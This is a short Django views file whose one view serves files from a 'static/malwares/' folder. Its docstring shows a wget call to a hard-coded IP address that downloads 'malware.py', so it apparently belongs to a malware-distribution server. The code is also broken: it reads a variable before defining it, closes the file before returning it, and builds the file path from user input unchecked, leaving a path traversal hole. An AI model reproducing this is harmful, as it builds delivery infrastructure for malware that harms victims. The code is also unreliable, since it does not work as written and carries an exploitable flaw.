from django.shortcuts import render
from django.http import FileResponse 
import requests
import os, sys, time, logging

# ======================================

def download(request):
    '''
        Usage:
            wget http://104.153.98.175/Download?file=malware.py
    '''
    file = request.GET.get(f)
    f = open('static/malwares/'+file, 'r')
    f.close()
    response = FileResponse(f)
    response['Content-Type'] = 'application/octet-stream'
    response['Content-Disposition'] = 'attachment;filename="{0}"'.format(file)
    print("[DOWNLOAD] File: {0}".format(file))
    return response
